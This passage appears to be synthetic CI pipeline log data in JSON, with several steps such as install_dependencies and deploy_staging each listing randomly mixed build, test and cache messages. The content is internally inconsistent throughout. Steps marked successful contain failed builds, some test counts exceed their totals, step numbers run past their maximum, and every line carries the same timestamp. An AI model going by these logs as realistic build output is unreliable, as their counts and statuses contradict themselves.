          "[12:20:11] WARN: Deprecated API usage",
          "Pulling image: python:3.11",
          "  PASS: e2e/test_api_health.spec.js",
          "Using Node.js 16.4.7",
          "Layer 6/14: RUN command",
          "Step 1/21: Running migrations",
          "[12:20:11] INFO: Request completed",
          "Creating production build...",
          "GET /status - 200 (72ms)",
          "\u2713 Task completed in 1554ms",
          "Bundling vendor.css",
          "pip: Collecting eslint",
          "pip: Installing build dependencies...",
          "[12:20:11] INFO: Starting build process",
          "[12:20:11] WARN: Deprecated API usage",
          "pip install: Successfully installed express-3.12",
          "Connection established",
          "OK",
          "POST /upload - 200 (122ms)",
          "Creating production build...",
          "Optimizing 56 modules...",
          "Step 20/19: Installing dependencies",
          "Compiling lib/utils.go...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "npm notice: package.json updated",
          "Cache saved successfully",
          "Compiling src/app.ts...",
          "Step 1/18: Deploying",
          "[12:20:11] DEBUG: Connection pool: 5 active",
          "[12:20:11] ERROR: Connection failed",
          "[12:20:11] INFO: Starting build process",
          "Success!",
          "Using Python 3.10",
          "Layer 6/14: COPY command",
          "[12:20:11] INFO: Starting build process",
          "Ready.",
          "Cache invalidated: node_modules",
          "Step 19/19: Running migrations",
          "Transforming 232 files...",
          "POST /api - 200 (151ms)",
          "[12:20:11] WARN: Deprecated API usage",
          "Environment: test",
          "Image pulled successfully",
          "Artifact uploaded: dist.zip (45MB)",
          "Compiling utils/utils.go...",
          "Building Docker image...",
          "\u2713 All checks passed",
          "[12:20:11] INFO: Starting build process",
          "GET /api - 200 (89ms)",
          "POST /upload - 200 (426ms)",
          "Installing lodash@2.1.9",
          "Cache hit for key-1365",
          "[12:20:11] INFO: Processing request",
          "Switched to branch 'bugfix/task-792'",
          "Success!",
          "Connection established",
          "pip: Installing build dependencies...",
          "pip: Downloading react-1.0.tar.gz",
          "Cache restored successfully (244MB)",
          "Checking out main branch",
          "pip: Downloading express-1.14.tar.gz",
          "Transforming 296 files...",
          "POST /data - 202 (406ms)",
          "pip: Installing build dependencies...",
          "Creating production build...",
          "[12:20:11] INFO: Processing request",
          "Cache restored successfully (45MB)",
          "Compiling src/utils.go...",
          "[12:20:11] DEBUG: Query executed in 4ms",
          "yarn add: Done in 9.78s",
          "\u2713 deploy completed",
          "FAILED: test_api_health",
          "[12:20:11] INFO: Starting build process",
          "Artifact uploaded: build.tar.gz (42MB)",
          "OK",
          "Cache invalidated: node_modules",
          "\u2713 Step 'build' succeeded",
          "Using Python 3.12",
          "Ran 74 tests in 19s",
          "Uploading artifact 'dist' (36 files)",
          "Cache miss for key-7708",
          "Compiling utils/app.ts...",
          "Artifact uploaded: dist.zip (29MB)",
          "pip: Installing build dependencies...",
          "\u2713 Step 'checkout' succeeded",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-12-05T12:21:55.254942",
        "finished_at": "2025-12-05T12:22:05.073014",
        "log_lines": [
          "=== Step: setup_environment ===",
          "Layer 7/11: COPY command",
          "WARNING: axios has known vulnerabilities",
          "Connection established",
          "Cache hit for key-1771",
          "\u2713 All checks passed",
          "Fetching submodules...",
          "WARNING: jest has known vulnerabilities",
          "\u2717 build failed with exit code 23",
          "\u2713 All checks passed",
          "Building Docker image...",
          "Creating production build...",
          "[12:20:11] INFO: Cache refreshed",
          "Fetching submodules...",
          "Compiling components/main.py...",
          "Compiling lib/service.java...",
          "Uploading artifact 'coverage' (18 files)",
          "Step 4/24: Linting",
          "Completed.",
          "POST /data - 201 (349ms)",
          "Cache miss for key-9477",
          "Minifying app.js",
          "[12:20:11] WARN: Deprecated API usage",
          "[12:20:11] ERROR: Connection failed",
          "Step 17/25: Testing",
          "\u2713 Step 'build' succeeded",
          "Minifying vendor.js",
          "Cache restored successfully (454MB)",
          "[12:20:11] WARN: Deprecated API usage",
          "Connecting to startup.dev:443...",
          "Verifying...",
          "Cache saved successfully",
          "Cache restored successfully (344MB)",
          "\u2713 All checks passed",
          "  PASS: unit/test_auth_login.spec.js",
          "[12:20:11] INFO: Cache refreshed",
          "  PASS: integration/test_cache_hit.spec.js",
          "npm install: resolved 1810 packages",
          "npm notice: package.json updated",
          "Building Docker image...",
          "Completed.",
          "Snapshots: 11 passed, 21 total",
          "Finished.",
          "Uploading artifact 'build' (42 files)",
          "Transforming 938 files...",
          "Step 3/25: Running migrations",
          "[12:20:11] INFO: Cache refreshed",
          "Tests: 116 passed, 218 total",
          "yarn add: Done in 28.72s",
          "npm install: added 27 packages",
          "GET /health - 204 (25ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Success!",
          "Tests: 97 passed, 228 total",
          "[12:20:11] WARN: Deprecated API usage",
          "[12:20:11] DEBUG: Query executed in 36ms",
          "Connection established",
          "[12:20:11] DEBUG: Query executed in 11ms",
          "Ready.",
          "Optimizing 35 modules...",
          "[12:20:11] DEBUG: Query executed in 67ms",
          "[12:20:11] DEBUG: Query executed in 41ms",
          "Artifact downloaded: 15MB",
          "Pushing to registry...",
          "Step 13/21: Testing",
          "HEAD is now at 5a26465",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Platform: win32-x64",
          "[12:20:11] ERROR: Connection failed",
          "Transforming 332 files...",
          "  PASS: test_user_create (97ms)",
          "\u2713 deploy completed",
          "Compiling src/index.js...",
          "Snapshots: 26 passed, 9 total",
          "[12:20:11] INFO: Processing request",
          "HEAD is now at c993e7a",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Snapshots: 43 passed, 27 total",
          "Installing prettier@3.6.3",
          "Tests: 269 passed, 165 total",
          "WARNING: eslint has known vulnerabilities",
          "Done.",
          "Layer 10/12: ENV command",
          "Pushing to registry...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Step 12/21: Deploying",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:20:11] DEBUG: Memory usage: 383MB",
          "[12:20:11] DEBUG: Memory usage: 1308MB",
          "Fetching submodules...",
          "Success!",
          "Layer 3/13: RUN command",
          "[12:20:11] DEBUG: Query executed in 92ms",
          "\u2713 All checks passed",
          "Step 1/19: Running migrations",
          "Generating source maps...",
          "  PASS: test_user_create (115ms)",
          "Generating source maps...",
          "Waiting...",
          "[12:20:11] INFO: Starting build process",
          "Cache miss for key-6161",
          "pip: Installing build dependencies...",
          "Minifying vendor.js",
          "FAILED: test_cache_hit",
          "Transforming 791 files...",
          "[12:20:11] INFO: Request completed",
          "Verifying...",
          "Uploading artifact 'dist' (15 files)",
          "Transforming 200 files...",
          "Finished.",
          "[12:20:11] DEBUG: Loading configuration",
          "Installing jest@4.4.0",
          "Step 4/18: Linting",
          "Transforming 915 files...",
          "Using Python 3.12",
          "[12:20:11] WARN: Deprecated API usage",
          "Step 19/24: Installing dependencies",
          "Fetching submodules...",
          "Processing...",
          "\u2713 Step 'test' succeeded",
          "TLS handshake completed",
          "[12:20:11] INFO: Connecting to database",
          "Loading...",
          "Minifying app.js",
          "yarn add: Done in 5.24s",
          "\u2713 Task completed in 406ms",
          "Connecting to cloud.services:443...",
          "Pushing to registry...",
          "Connection established",
          "Generating source maps...",
          "\u2713 Task completed in 3807ms",
          "[12:20:11] INFO: Cache refreshed",
          "Already up to date.",
          "Artifact uploaded: dist.zip (79MB)",
          "\u2717 build failed with exit code 118",
          "Step 19/19: Testing",
          "Using Node.js 18.7.7",
          "Tests: 133 passed, 450 total",
          "Using Python 3.10",
          "Cache hit for key-4523",
          "Step 16/23: Building",
          "Snapshots: 21 passed, 15 total",
          "Artifact downloaded: 6MB",
          "Creating production build...",
          "Tests: 451 passed, 350 total",
          "Transforming 893 files...",
          "Optimizing 31 modules...",
          "[12:20:11] WARN: Deprecated API usage",
          "WARNING: jest has known vulnerabilities",
          "  PASS: test_user_create (318ms)",
          "Checking out develop branch",
          "Step 7/20: Testing",
          "GET /status - 200 (58ms)",
          "WARNING: eslint has known vulnerabilities",
          "Generating source maps...",
          "Optimizing 51 modules...",
          "WARNING: react has known vulnerabilities",
          "Step 2/25: Building",
          "Cache hit for key-5948",
          "NODE_ENV=production",
          "Uploading artifact 'dist' (8 files)",
          "npm install: added 88 packages",
          "[12:20:11] INFO: Processing request",
          "WARNING: prettier has known vulnerabilities",
          "Layer 9/10: RUN command",
          "\u2713 Step 'install' succeeded",
          "  PASS: test_auth_login (183ms)",
          "Using Node.js 18.5.8",
          "[12:20:11] WARN: Deprecated API usage",
          "Checking out main branch",
          "Artifact uploaded: dist.zip (15MB)",
          "Creating production build...",
          "Compiling components/utils.go...",
          "Cache hit for key-8597",
          "\u2713 All checks passed",
          "Already up to date.",
          "[12:20:11] INFO: Connecting to database",
          "npm notice: package.json updated",
          "Cache invalidated: node_modules",
          "Compiling components/app.ts...",
          "OK",
          "pip: Collecting prettier",
          "Time: 1.715s",
          "Finished.",
          "Minifying app.js",
          "npm notice: created a lockfile",
          "Artifact downloaded: 11MB",
          "Finished.",
          "Compiling components/utils.go...",
          "  PASS: unit/test_auth_login.spec.js",
          "Completed.",
          "Done.",
          "\u2713 Step 'build' succeeded",
          "Loading...",
          "[12:20:11] WARN: Deprecated API usage",
          "Pushing to registry...",
          "pip: Installing build dependencies...",
          "[12:20:11] WARN: Deprecated API usage",
          "\u2713 Step 'install' succeeded",
          "Cache invalidated: dependencies",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Fetching submodules...",
          "Success!",
          "Ready.",
          "Processing...",
          "[12:20:11] INFO: Processing request",
          "Generating source maps...",
          "Cache hit for key-2468",
          "Finished.",
          "Step 9/24: Deploying",
          "Minifying main.js",
          "Pushing to registry...",
          "WARNING: express has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Cache restored successfully (371MB)",
          "\u2717 build failed with exit code 106",
          "Compiling utils/main.py...",
          "Cache hit for key-1978",
          "  PASS: test_db_connect (311ms)",
          "POST /upload - 202 (450ms)",
          "Loading...",
          "[12:20:11] WARN: Deprecated API usage",
          "Optimizing 55 modules...",
          "WARNING: lodash has known vulnerabilities",
          "WARNING: jest has known vulnerabilities",
          "Platform: linux-x64",
          "WARNING: webpack has known vulnerabilities",
          "Loading...",
          "npm install: added 59 packages",
          "Cache restored successfully (496MB)",
          "Cache hit for key-4646",
          "[12:20:11] DEBUG: Memory usage: 641MB",
          "Connecting to startup.dev:443...",
          "Using Node.js 15.2.2",
          "Tests: 229 passed, 76 total",
          "TLS handshake completed",
          "Tests: 443 passed, 141 total",
          "\u2713 Task completed in 1252ms",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 16/20: Linting",
          "  PASS: test_api_health (108ms)",
          "Finished.",
          "[12:20:11] DEBUG: Initializing service",
          "[12:20:11] DEBUG: Connection pool: 16 active",
          "Step 17/15: Running migrations",
          "Transforming 106 files...",
          "Success!",
          "Checking out main branch",
          "[12:20:11] INFO: Request completed",
          "Ready.",
          "Optimizing 48 modules...",
          "  PASS: unit/test_user_create.spec.js",
          "HEAD is now at 794b257",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-12-05T12:22:05.073014",
        "finished_at": "2025-12-05T12:22:14.891086",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "[12:20:11] DEBUG: Loading configuration",
          "NODE_ENV=production",
          "Switched to branch 'feature/task-862'",
          "Cache invalidated: dependencies",
          "Connection established",
          "Already up to date.",
          "Building Docker image...",
          "WARNING: eslint has known vulnerabilities",
          "[12:20:11] INFO: Processing request",
          "Time: 115.530s",
          "Finished.",
          "  PASS: test_auth_login (209ms)",
          "Verifying...",
          "Ran 23 tests in 44s",
          "Cache hit for key-7752",
          "Completed.",
          "Connection established",
          "Layer 6/12: ENV command",
          "Optimizing 12 modules...",
          "Coverage: 73% statements, 80% branches",
          "Environment: staging",
          "Processing...",
          "Step 15/16: Running migrations",
          "yarn add: Done in 26.97s",
          "Compiling src/app.ts...",
          "\u2713 Task completed in 1813ms",
          "Snapshots: 24 passed, 50 total",
          "NODE_ENV=test",
          "Loading...",
          "Layer 4/10: ENV command",
          "Minifying app.js",
          "Ran 43 tests in 48s",
          "Cache hit for key-9266",
          "Snapshots: 40 passed, 6 total",
          "Compiling src/index.js...",
          "Switched to branch 'bugfix/task-377'",
          "[12:20:11] DEBUG: Query executed in 76ms",
          "Loading...",
          "  PASS: integration/test_api_health.spec.js",
          "Connection established",
          "[12:20:11] DEBUG: Loading configuration",
          "Already up to date.",
          "Connecting to startup.dev:443...",
          "Step 17/22: Linting",
          "npm notice: package.json updated",
          "[12:20:11] INFO: Connecting to database",
          "[12:20:11] DEBUG: Initializing service",
          "Completed.",
          "Ready.",
          "  PASS: test_api_health (283ms)",
          "Environment: production",
          "pip install: Successfully installed webpack-3.5",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling src/handler.rs...",
          "NODE_ENV=test",
          "[12:20:11] DEBUG: Query executed in 12ms",
          "HEAD is now at 4567d41",
          "Uploading artifact 'build' (34 files)",
          "[12:20:11] INFO: Cache refreshed",
          "Step 13/22: Testing",
          "Fetching submodules...",
          "TLS handshake completed",
          "Compiling components/utils.go...",
          "Cache miss for key-5565",
          "\u2717 build failed with exit code 23",
          "Compiling lib/handler.rs...",
          "Connection established",
          "[12:20:11] DEBUG: Connection pool: 7 active",
          "HEAD is now at aaf24eb",
          "Compiling utils/main.py...",
          "\u2713 Task completed in 3426ms",
          "[12:20:11] INFO: Processing request",
          "\u2713 All checks passed",
          "Installing prettier@3.5.8",
          "Pushing to registry...",
          "Success!",
          "Already up to date.",
          "WARNING: lodash has known vulnerabilities",
          "Time: 52.549s",
          "Ran 140 tests in 32s",
          "[12:20:11] INFO: Request completed",
          "Test Suites: 42 passed, 32 total",
          "[12:20:11] INFO: Request completed",
          "  PASS: test_cache_hit (344ms)",
          "[12:20:11] DEBUG: Memory usage: 1506MB",
          "Compiling lib/utils.go...",
          "Connection established",
          "Cache invalidated: node_modules",
          "Creating production build...",
          "HEAD is now at 6ea61e6",
          "Building Docker image...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Loading...",
          "[12:20:11] WARN: Deprecated API usage",
          "[12:20:11] INFO: Starting build process",
          "Using Node.js 20.5.4",
          "Waiting...",
          "npm install: resolved 842 packages",
          "Pulling image: alpine:latest",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2717 build failed with exit code 83",
          "POST /upload - 201 (271ms)",
          "pip: Installing build dependencies...",
          "Pulling image: node:3.11",
          "Environment: development",
          "Loading...",
          "WARNING: eslint has known vulnerabilities",
          "WARNING: axios has known vulnerabilities",
          "Layer 6/12: ENV command",
          "Snapshots: 30 passed, 30 total",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Installing express@5.12.5",
          "[12:20:11] INFO: Starting build process",
          "Building Docker image...",
          "pip: Collecting eslint",
          "Creating production build...",
          "pip: Downloading express-3.10.tar.gz",
          "Already up to date.",
          "Connection established",
          "Compiling utils/main.py...",
          "FAILED: test_db_connect",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Optimizing 92 modules...",
          "Step 20/19: Building",
          "[12:20:11] INFO: Request completed",
          "Step 18/16: Linting",
          "Done.",
          "FAILED: test_api_health",
          "[12:20:11] ERROR: Connection failed",
          "Time: 103.815s",
          "[12:20:11] INFO: Request completed",
          "FAILED: test_auth_login",
          "npm install: resolved 1161 packages",
          "yarn add: Done in 30.13s",
          "HEAD is now at 2156774",
          "Uploading artifact 'build' (9 files)",
          "[12:20:11] DEBUG: Loading configuration",
          "Artifact downloaded: 16MB",
          "npm install: resolved 1271 packages",
          "[12:20:11] DEBUG: Memory usage: 671MB",
          "Compiling lib/app.ts...",
          "Processing...",
          "Connection established",
          "[12:20:11] WARN: Deprecated API usage",
          "Finished.",
          "Step 5/17: Building",
          "Already up to date.",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "POST /api - 202 (307ms)",
          "Using Python 3.12",
          "[12:20:11] INFO: Request completed",
          "Uploading artifact 'coverage' (39 files)",
          "Minifying main.js",
          "Layer 4/12: ENV command",
          "\u2717 build failed with exit code 32",
          "Verifying...",
          "Platform: linux-x64",
          "[12:20:11] DEBUG: Connection pool: 4 active",
          "Compiling src/service.java...",
          "[12:20:11] DEBUG: Query executed in 84ms",
          "TLS handshake completed",
          "[12:20:11] INFO: Connecting to database",
          "Test Suites: 38 passed, 18 total",
          "Finished.",
          "\u2713 test completed",
          "npm notice: package.json updated",
          "Cache restored successfully (419MB)",
          "[12:20:11] DEBUG: Initializing service",
          "pip: Downloading axios-5.12.tar.gz",
          "Compiling src/service.java...",
          "Generating source maps...",
          "Cache miss for key-4615",
          "GET /status - 200 (60ms)",
          "HEAD is now at 5e33496",
          "Pulling image: alpine:latest",
          "Cache hit for key-6849",
          "Installing axios@4.11.4",
          "Verifying...",
          "Checking out main branch",
          "Generating source maps...",
          "Layer 7/12: RUN command",
          "Switched to branch 'hotfix/task-433'",
          "\u2713 Step 'checkout' succeeded",
          "pip: Installing build dependencies...",
          "Time: 110.291s",
          "\u2713 Step 'build' succeeded",
          "Ran 144 tests in 8s",
          "\u2713 Step 'install' succeeded",
          "Done.",
          "Step 7/24: Deploying",
          "\u2713 deploy completed",
          "Compiling src/service.java...",
          "Step 18/24: Testing",
          "Loading...",
          "Fetching submodules...",
          "Environment: production",
          "Waiting...",
          "Step 19/17: Deploying",
          "[12:20:11] DEBUG: Connection pool: 5 active",
          "yarn add: Done in 11.95s",
          "Installing lodash@1.7.9",
          "Environment: staging",
          "Ran 169 tests in 37s",
          "[12:20:11] INFO: Cache refreshed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Building Docker image...",
          "[12:20:11] DEBUG: Initializing service",
          "Verifying...",
          "Bundling vendor.css",
          "npm notice: package.json updated",
          "Cache restored successfully (49MB)",
          "Cache miss for key-6611",
          "TLS handshake completed",
          "Cache miss for key-2019",
          "Cache invalidated: build",
          "Already up to date.",
          "npm install: resolved 1653 packages",
          "npm install: resolved 223 packages",
          "pip install: Successfully installed express-3.20",
          "[12:20:11] WARN: Deprecated API usage",
          "\u2717 build failed with exit code 103",
          "[12:20:11] WARN: Deprecated API usage",
          "[12:20:11] DEBUG: Memory usage: 883MB",
          "Connection established",
          "Creating production build...",
          "  PASS: test_db_connect (212ms)",
          "Environment: development",
          "[12:20:11] INFO: Request completed",
          "  PASS: test_db_connect (86ms)",
          "[12:20:11] WARN: Deprecated API usage",
          "TLS handshake completed",
          "pip: Installing build dependencies...",
          "pip install: Successfully installed webpack-4.9",
          "Exception: TypeError",
          "Environment: test",
          "npm notice: package.json updated",
          "Compiling utils/main.py...",
          "Environment: production",
          "Completed.",
          "Cache hit for key-7605",
          "Using Node.js 17.9.5",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "pip: Downloading react-5.1.tar.gz",
          "Optimizing 22 modules...",
          "Processing...",
          "Layer 6/8: RUN command",
          "Optimizing 28 modules...",
          "Installing express@1.6.2",
          "Test Suites: 15 passed, 18 total",
          "Artifact uploaded: dist.zip (89MB)",
          "Cache miss for key-3170",
          "Pushing to registry...",
          "Switched to branch 'hotfix/task-487'",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-12-05T12:22:14.891086",
        "finished_at": "2025-12-05T12:22:20.781929",
        "log_lines": [
          "=== Step: restore_cache ===",
          "Exception: RuntimeError",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Ran 79 tests in 7s",
          "Snapshots: 4 passed, 7 total",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Image pulled successfully",
          "Checking out master branch",
          "npm install: resolved 749 packages",
          "Cache miss for key-8587",
          "GET /status - 201 (66ms)",
          "Minifying vendor.js",
          "Done.",
          "Installing prettier@1.0.5",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Uploading artifact 'dist' (21 files)",
          "Completed.",
          "HEAD is now at 304ca32",
          "[12:20:11] DEBUG: Memory usage: 358MB",
          "Exception: RuntimeError",
          "TLS handshake completed",
          "[12:20:11] INFO: Connecting to database",
          "[12:20:11] WARN: Deprecated API usage",
          "Connecting to startup.dev:443...",
          "Time: 19.655s",
          "Creating production build...",
          "WARNING: axios has known vulnerabilities",
          "Connecting to example.com:443...",
          "Cache miss for key-4259",
          "pip: Downloading jest-4.16.tar.gz",
          "[12:20:11] DEBUG: Query executed in 89ms",
          "npm notice: created a lockfile",
          "[12:20:11] DEBUG: Memory usage: 915MB",
          "[12:20:11] WARN: Deprecated API usage",
          "[12:20:11] DEBUG: Query executed in 43ms",
          "Waiting...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Bundling styles.js",
          "Layer 1/8: COPY command",
          "Tests: 64 passed, 171 total",
          "GET /health - 201 (42ms)",
          "\u2713 lint completed",
          "Optimizing 62 modules...",
          "Using Python 3.12",
          "\u2713 All checks passed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "  PASS: test_cache_hit (15ms)",
          "[12:20:11] INFO: Request completed",
          "[12:20:11] WARN: Deprecated API usage",
          "[12:20:11] DEBUG: Memory usage: 738MB",
          "Pushing to registry...",
          "Optimizing 56 modules...",
          "\u2713 Step 'install' succeeded",
          "pip: Downloading axios-1.13.tar.gz",
          "Checking out develop branch",
          "[12:20:11] INFO: Request completed",
          "Step 6/17: Building",
          "Step 20/18: Linting",
          "OK",
          "Waiting...",
          "Step 19/21: Building",
          "npm notice: created a lockfile",
          "Pushing to registry...",
          "Step 18/23: Building",
          "[12:20:11] WARN: Deprecated API usage",
          "Environment: staging",
          "[12:20:11] DEBUG: Query executed in 50ms",
          "[12:20:11] INFO: Processing request",
          "HEAD is now at 556db52",
          "Fetching submodules...",
          "Cache invalidated: dependencies",
          "Cache restored successfully (403MB)",
          "Cache miss for key-3228",
          "WARNING: lodash has known vulnerabilities",
          "[12:20:11] INFO: Processing request",
          "Snapshots: 26 passed, 28 total",
          "Pushing to registry...",
          "pip: Downloading lodash-1.11.tar.gz",
          "Step 1/19: Running migrations",
          "Tests: 92 passed, 96 total",
          "[12:20:11] INFO: Request completed",
          "Transforming 467 files...",
          "Step 14/19: Installing dependencies",
          "Environment: production",
          "\u2713 All checks passed",
          "[12:20:11] DEBUG: Loading configuration",
          "pip: Downloading jest-3.10.tar.gz",
          "Checking out main branch",
          "Tests: 461 passed, 152 total",
          "Compiling src/handler.rs...",
          "Artifact uploaded: dist.zip (77MB)",
          "Waiting...",
          "GET /status - 200 (16ms)",
          "Installing express@5.0.2",
          "Cache hit for key-3475",
          "NODE_ENV=production",
          "Tests: 337 passed, 435 total",
          "OK",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Using Python 3.9",
          "POST /data - 201 (358ms)",
          "[12:20:11] INFO: Starting build process",
          "Compiling utils/utils.go...",
          "Image pulled successfully",
          "Exception: ValueError",
          "Fetching submodules...",
          "Step 13/15: Running migrations",
          "npm install: added 73 packages",
          "\u2713 Task completed in 1693ms",
          "Building Docker image...",
          "npm install: resolved 623 packages",
          "Cache saved successfully",
          "[12:20:11] DEBUG: Loading configuration",
          "Coverage: 96% statements, 64% branches",
          "NODE_ENV=production",
          "Switched to branch 'bugfix/task-756'",
          "Snapshots: 45 passed, 8 total",
          "Using Node.js 15.20.10",
          "Completed.",
          "TLS handshake completed",
          "[12:20:11] INFO: Cache refreshed",
          "[12:20:11] WARN: Deprecated API usage",
          "Test Suites: 7 passed, 50 total",
          "Success!",
          "[12:20:11] DEBUG: Connection pool: 8 active",
          "Environment: test",
          "Environment: production",
          "Processing...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "GET /health - 200 (66ms)",
          "Coverage: 75% statements, 60% branches",
          "[12:20:11] DEBUG: Query executed in 5ms",
          "Step 9/16: Testing",
          "Test Suites: 11 passed, 49 total",
          "Artifact downloaded: 34MB",
          "GET /health - 201 (60ms)",
          "Ran 130 tests in 18s",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Pulling image: alpine:3.11",
          "Creating production build...",
          "[12:20:11] WARN: Deprecated API usage",
          "Compiling lib/handler.rs...",
          "Snapshots: 29 passed, 6 total",
          "Pulling image: alpine:3.11",
          "Snapshots: 35 passed, 18 total",
          "yarn add: Done in 17.30s",
          "Step 18/17: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 16/19: Installing dependencies",
          "Cache hit for key-4241",
          "Loading...",
          "\u2717 build failed with exit code 127",
          "NODE_ENV=development",
          "[12:20:11] INFO: Cache refreshed",
          "Finished.",
          "Loading...",
          "Minifying vendor.js",
          "yarn add: Done in 30.96s",
          "Test Suites: 37 passed, 27 total",
          "Processing...",
          "Artifact downloaded: 35MB",
          "Ready.",
          "Step 10/25: Deploying",
          "POST /upload - 201 (271ms)",
          "Ran 79 tests in 3s",
          "[12:20:11] INFO: Cache refreshed",
          "\u2713 Task completed in 1258ms",
          "WARNING: lodash has known vulnerabilities",
          "[12:20:11] INFO: Request completed",
          "Ran 25 tests in 41s",
          "Done.",
          "Cache miss for key-5579",
          "NODE_ENV=test",
          "\u2713 validate completed",
          "Cache hit for key-7563",
          "Generating source maps...",
          "Step 15/21: Deploying",
          "Completed.",
          "Cache invalidated: dependencies",
          "Cache hit for key-2399",
          "[12:20:11] DEBUG: Query executed in 47ms",
          "Success!",
          "Transforming 308 files...",
          "Compiling src/service.java...",
          "Artifact downloaded: 12MB",
          "Finished.",
          "[12:20:11] WARN: Deprecated API usage",
          "Cache hit for key-4043",
          "Using Node.js 17.13.0",
          "TLS handshake completed",
          "Completed.",
          "Fetching submodules...",
          "Step 1/24: Deploying",
          "Platform: darwin-arm64",
          "Using Node.js 15.20.9",
          "[12:20:11] ERROR: Connection failed",
          "Exception: TypeError",
          "Done.",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:20:11] WARN: Deprecated API usage",
          "[12:20:11] ERROR: Connection failed",
          "Finished.",
          "\u2717 build failed with exit code 95",
          "GET /status - 200 (50ms)",
          "[12:20:11] DEBUG: Memory usage: 879MB",
          "Compiling lib/utils.go...",
          "Cache hit for key-9485",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Processing...",
          "  PASS: unit/test_api_health.spec.js",
          "Step 16/23: Linting",
          "Step 10/16: Linting",
          "Loading...",
          "Tests: 344 passed, 401 total",
          "Image pulled successfully",
          "Step 19/15: Running migrations",
          "pip: Downloading react-2.10.tar.gz",
          "Layer 4/13: RUN command",
          "WARNING: react has known vulnerabilities",
          "Building Docker image...",
          "yarn add: Done in 3.94s",
          "npm install: added 32 packages",
          "Coverage: 89% statements, 100% branches",
          "\u2713 All checks passed",
          "Already up to date.",
          "[12:20:11] DEBUG: Loading configuration",
          "Cache saved successfully",
          "Step 2/25: Testing",
          "Cache saved successfully",
          "Connecting to startup.dev:443...",
          "[12:20:11] DEBUG: Query executed in 28ms",
          "Ready.",
          "\u2713 All checks passed",
          "[12:20:11] WARN: Deprecated API usage",
          "FAILED: test_db_connect",
          "Using Node.js 20.19.6",
          "[12:20:11] DEBUG: Loading configuration",
          "OK",
          "Artifact downloaded: 9MB",
          "npm install: added 262 packages",
          "[12:20:11] DEBUG: Query executed in 2ms",
          "Connecting to startup.dev:443...",
          "npm notice: created a lockfile",
          "  PASS: e2e/test_auth_login.spec.js",
          "Artifact uploaded: dist.zip (69MB)",
          "WARNING: axios has known vulnerabilities",
          "[12:20:11] INFO: Connecting to database",
          "[12:20:11] DEBUG: Loading configuration",
          "NODE_ENV=test",
          "npm notice: package.json updated",
          "WARNING: axios has known vulnerabilities",
          "pip: Installing build dependencies...",
          "Coverage: 75% statements, 97% branches",
          "\u2713 All checks passed",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-12-05T12:22:20.781929",
        "finished_at": "2025-12-05T12:22:24.709158",
        "log_lines": [
          "=== Step: checkout ===",
          "Processing...",
          "Snapshots: 46 passed, 44 total",
          "Checking out master branch",
          "Artifact downloaded: 4MB",
          "Ready.",
          "[12:20:11] DEBUG: Connection pool: 1 active",
          "Ran 68 tests in 50s",
          "Test Suites: 15 passed, 45 total",
          "Artifact uploaded: build.tar.gz (25MB)",
          "\u2713 All checks passed",
          "Generating source maps...",
          "Image pulled successfully",
          "Compiling lib/utils.go...",
          "Generating source maps...",
          "Cache invalidated: node_modules",
          "Cache miss for key-5150",
          "pip: Collecting lodash",
          "[12:20:11] ERROR: Connection failed",
          "Processing...",
          "[12:20:11] WARN: Deprecated API usage",
          "Step 15/25: Building",
          "Done.",
          "yarn add: Done in 17.12s",
          "pip: Downloading express-5.11.tar.gz",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Uploading artifact 'coverage' (27 files)",
          "Uploading artifact 'build' (47 files)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Finished.",
          "npm install: resolved 1310 packages",
          "Pushing to registry...",
          "[12:20:11] DEBUG: Memory usage: 1478MB",
          "Time: 30.6s",
          "Snapshots: 7 passed, 0 total",
          "Creating production build...",
          "\u2713 All checks passed",
          "[12:20:11] ERROR: Connection failed",
          "Connection established",
          "Layer 2/11: COPY command",
          "  PASS: unit/test_api_health.spec.js",
          "Connection established",
          "POST /api - 200 (179ms)",
          "Cache miss for key-2123",
          "Done.",
          "Compiling components/app.ts...",
          "[12:20:11] WARN: Deprecated API usage",
          "Step 12/20: Testing",
          "Checking out develop branch",
          "Finished.",
          "[12:20:11] INFO: Cache refreshed",
          "[12:20:11] DEBUG: Query executed in 31ms",
          "Ready.",
